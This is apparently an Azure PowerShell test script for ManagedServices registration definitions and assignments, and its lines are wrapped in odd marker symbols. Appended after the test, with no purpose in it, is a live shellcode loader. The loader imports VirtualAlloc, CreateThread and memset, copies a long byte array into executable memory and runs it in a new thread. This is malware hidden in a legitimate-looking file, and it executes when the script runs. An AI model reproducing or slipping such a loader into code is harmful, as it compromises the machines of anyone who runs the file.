















 -||-> function New-AzManagedServicesAssignmentWithId
{
    [CmdletBinding()]
    param(
        [string] [Parameter()] $Scope,
        [string] [Parameter()] $RegistrationDefinitionResourceId,
        [Guid]   [Parameter()] $RegistrationAssignmentId
    )

     -||-> $profile = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile <-||- 
     -||-> $cmdlet =  -||-> New-Object -TypeName Microsoft.Azure.PowerShell.Cmdlets.ManagedServices.Commands.NewAzureRmManagedServicesAssignment <-||-  <-||- 
     -||-> $cmdlet.DefaultProfile = $profile <-||- 
	 -||-> $cmdlet.CommandRuntime = $PSCmdlet.CommandRuntime <-||- 

     -||-> if ( -||-> -not ( -||-> [string]::IsNullOrEmpty($Scope) <-||- ) <-||- )
    {
         -||-> $cmdlet.Scope = $Scope <-||- 
    } <-||- 

     -||-> if ( -||-> -not ( -||-> [string]::IsNullOrEmpty($RegistrationDefinitionResourceId) <-||- ) <-||- )
    {	
         -||-> $cmdlet.RegistrationDefinitionResourceId = $RegistrationDefinitionResourceId <-||- 
    } <-||- 

     -||-> if ( -||-> $RegistrationAssignmentId -ne $null -and $RegistrationAssignmentId -ne [System.Guid]::Empty <-||- )
    {
		 -||-> $cmdlet.RegistrationAssignmentId = $RegistrationAssignmentId <-||- 
    } <-||- 

     -||-> $cmdlet.ExecuteCmdlet() <-||- 
} <-||- 

 -||-> function New-AzManagedServicesDefinitionWithId
{
    [CmdletBinding()]
    param(
        [string] [Parameter()] $Name,
        [string] [Parameter()] $ManagedByTenantId,
        [string] [Parameter()] $PrincipalId,
        [string] [Parameter()] $RoleDefinitionId,
		[string] [Parameter()] $Description,
        [Guid]   [Parameter()] $RegistrationDefinitionId
    )

     -||-> $profile = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile <-||- 
     -||-> $cmdlet =  -||-> New-Object -TypeName Microsoft.Azure.PowerShell.Cmdlets.ManagedServices.Commands.NewAzureRmManagedServicesDefinition <-||-  <-||- 
     -||-> $cmdlet.DefaultProfile = $profile <-||- 
	 -||-> $cmdlet.CommandRuntime = $PSCmdlet.CommandRuntime <-||- 

     -||-> if ( -||-> -not ( -||-> [string]::IsNullOrEmpty($Description) <-||- ) <-||- )
    {
         -||-> $cmdlet.Description = $Description <-||- 
    } <-||- 

     -||-> if ( -||-> -not ( -||-> [string]::IsNullOrEmpty($Name) <-||- ) <-||- )
    {
         -||-> $cmdlet.Name = $Name <-||- 
    } <-||- 

     -||-> if ( -||-> -not ( -||-> [string]::IsNullOrEmpty($ManagedByTenantId) <-||- ) <-||- )
    {
         -||-> $cmdlet.ManagedByTenantId = $ManagedByTenantId <-||- 
    } <-||- 

     -||-> if ( -||-> -not ( -||-> [string]::IsNullOrEmpty($PrincipalId) <-||- ) <-||- )
    {
         -||-> $cmdlet.PrincipalId = $PrincipalId <-||- 
    } <-||- 

     -||-> if ( -||-> -not ( -||-> [string]::IsNullOrEmpty($RoleDefinitionId) <-||- ) <-||- )
    {
         -||-> $cmdlet.RoleDefinitionId = $RoleDefinitionId <-||- 
    } <-||- 

     -||-> if ( -||-> $RegistrationDefinitionId -ne $null -and $RegistrationDefinitionId -ne [System.Guid]::Empty <-||- )
    {
         -||-> $cmdlet.RegistrationDefinitionId = $RegistrationDefinitionId <-||- 
    } <-||- 

     -||-> $cmdlet.ExecuteCmdlet() <-||- 
} <-||- 

 -||-> function Test-ManagedServices_CRUD
{
     -||-> $roleDefinitionId = "acdd72a7-3385-48ef-bd42-f606fba81ae7" <-||- ;
	 -||-> $managedByTenantId = "bab3375b-6197-4a15-a44b-16c41faa91d7" <-||- ;
	 -||-> $principalId = "d6f6c88a-5b7a-455e-ba40-ce146d4d3671" <-||- ;
	 -||-> $subscriptionId = "002b3477-bfbf-4402-b377-6003168b75d3" <-||- 
	 -||-> $name =  -||-> getAssetName <-||-  <-||- 
	 -||-> $assignmentId = "8af8768c-73c2-4993-86ae-7a45c9b232c6" <-||- ;
	 -||-> $definitionId = "1ccdb215-959a-48b9-bd7c-0584d461ea6c" <-||- 

	
	 -||-> $definition =  -||-> New-AzManagedServicesDefinitionWithId -ManagedByTenantId $managedByTenantId -RoleDefinitionId $roleDefinitionId -PrincipalId $principalId -Name $name -RegistrationDefinitionId $definitionId <-||-  <-||- 

	 -||-> Assert-AreEqual $name $definition.Properties.Name <-||- 
	 -||-> Assert-AreEqual $managedByTenantId $definition.Properties.ManagedByTenantId <-||-  
	 -||-> Assert-AreEqual $roleDefinitionId $definition.Properties.Authorization[0].RoleDefinitionId <-||-  
	 -||-> Assert-AreEqual $principalId $definition.Properties.Authorization[0].PrincipalId <-||- 	

	
	 -||-> $getDef =  -||-> Get-AzManagedServicesDefinition -Name $definitionId <-||-  <-||- 
	 -||-> Assert-NotNull $getDef <-||- 
	 -||-> Assert-AreEqual $definition.Id $getDef.Id <-||- 

	
	 -||-> $assignment =  -||-> New-AzManagedServicesAssignmentWithId `
					-RegistrationDefinitionResourceId $definition.Id `
					-RegistrationAssignmentId $assignmentId <-||-  <-||- 	
	 -||-> Assert-NotNull $assignment <-||- 

	
	 -||-> $getAssignment =  -||-> Get-AzManagedServicesAssignment -Id $assignmentId -ExpandRegistrationDefinition <-||-  <-||- 
	 -||-> Assert-NotNull $getAssignment <-||- 
	 -||-> Assert-AreEqual $assignment.Id $getAssignment.Id <-||- 
	 -||-> Assert-AreEqual $definition.Id $getAssignment.Properties.RegistrationDefinitionId <-||- 

	
	 -||-> Remove-AzManagedServicesAssignment -Id $assignmentId <-||- 
	
	
	 -||-> Remove-AzManagedServicesDefinition -Id $definitionId <-||- 

	
	 -||-> $assignments =  -||-> Get-AzManagedServicesAssignment <-||-  <-||- 
	 -||-> Foreach($assignment in  -||-> $assignments <-||- )
	{
		 -||-> Assert-AreNotEqual( -||-> $assignmentId, $assignment.Name <-||- ) <-||- 
	} <-||- 

	
	 -||-> $definitions =  -||-> Get-AzManagedServicesDefinition <-||-  <-||- 
	 -||-> Foreach($definition in  -||-> $definitions <-||- )
	{
		 -||-> Assert-AreNotEqual( -||-> $definitionId, $definition.Name <-||- ) <-||- 
	} <-||- 
} <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0xaf,0x59,0x46,0x3f,0xdb,0xc6,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x5a,0x31,0x7e,0x12,0x03,0x7e,0x12,0x83,0x41,0xa5,0xa4,0xca,0x61,0xbe,0xab,0x35,0x99,0x3f,0xcc,0xbc,0x7c,0x0e,0xcc,0xdb,0xf5,0x21,0xfc,0xa8,0x5b,0xce,0x77,0xfc,0x4f,0x45,0xf5,0x29,0x60,0xee,0xb0,0x0f,0x4f,0xef,0xe9,0x6c,0xce,0x73,0xf0,0xa0,0x30,0x4d,0x3b,0xb5,0x31,0x8a,0x26,0x34,0x63,0x43,0x2c,0xeb,0x93,0xe0,0x78,0x30,0x18,0xba,0x6d,0x30,0xfd,0x0b,0x8f,0x11,0x50,0x07,0xd6,0xb1,0x53,0xc4,0x62,0xf8,0x4b,0x09,0x4e,0xb2,0xe0,0xf9,0x24,0x45,0x20,0x30,0xc4,0xea,0x0d,0xfc,0x37,0xf2,0x4a,0x3b,0xa8,0x81,0xa2,0x3f,0x55,0x92,0x71,0x3d,0x81,0x17,0x61,0xe5,0x42,0x8f,0x4d,0x17,0x86,0x56,0x06,0x1b,0x63,0x1c,0x40,0x38,0x72,0xf1,0xfb,0x44,0xff,0xf4,0x2b,0xcd,0xbb,0xd2,0xef,0x95,0x18,0x7a,0xb6,0x73,0xce,0x83,0xa8,0xdb,0xaf,0x21,0xa3,0xf6,0xa4,0x5b,0xee,0x9e,0x09,0x56,0x10,0x5f,0x06,0xe1,0x63,0x6d,0x89,0x59,0xeb,0xdd,0x42,0x44,0xec,0x22,0x79,0x30,0x62,0xdd,0x82,0x41,0xab,0x1a,0xd6,0x11,0xc3,0x8b,0x57,0xfa,0x13,0x33,0x82,0xad,0x43,0x9b,0x7d,0x0e,0x33,0x5b,0x2e,0xe6,0x59,0x54,0x11,0x16,0x62,0xbe,0x3a,0x3f,0xdc,0x41,0x45,0xc0,0xb1,0x20,0x2b,0xb4,0x3c,0xd0,0xde,0x55,0xcc,0x75,0x54,0xe5,0x1e,0x14,0xf9,0x24,0x37,0x98,0x2b,0x55,0xae,0x22,0x34,0xc1,0x68,0x8b,0x6c,0xa9,0xd0,0x73,0xd5,0x11,0xb8,0xdb,0xbd,0xf9,0x60,0x84,0x65,0xa2,0xc8,0x6c,0xce,0x0a,0xb0,0xd4,0xb6,0xf2,0x18,0xbd,0x1e,0x5b,0xc0,0x65,0xc7,0x03,0xa8,0xcd,0xaf,0xeb,0x10,0xb6,0x17,0x0c,0xc8,0xef,0x80,0x38,0x88,0x0f,0x05,0xcb,0xc8,0xf3,0xcc,0xc9,0x98,0x63,0x13,0xd2,0x19,0xcf,0x9a,0x34,0x73,0x3f,0xcb,0xef,0xeb,0xa6,0x56,0x7b,0x8a,0x27,0x4d,0x01,0x8c,0xac,0x62,0xf5,0x42,0x45,0x0e,0xe5,0x32,0xa5,0x45,0x57,0x94,0xba,0x73,0xf2,0x18,0x2f,0x78,0x55,0x4f,0xc7,0x82,0x80,0xa7,0x48,0x7c,0xe7,0xbc,0x41,0xe8,0x48,0xaa,0xad,0xfc,0x48,0x2a,0xf8,0x96,0x48,0x42,0x5c,0xc3,0x1a,0x77,0xa3,0xde,0x0e,0x24,0x36,0xe1,0x66,0x99,0x91,0x89,0x84,0xc4,0xd6,0x15,0x76,0x23,0xe7,0x6a,0xa1,0x0d,0x9d,0x82,0x71 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



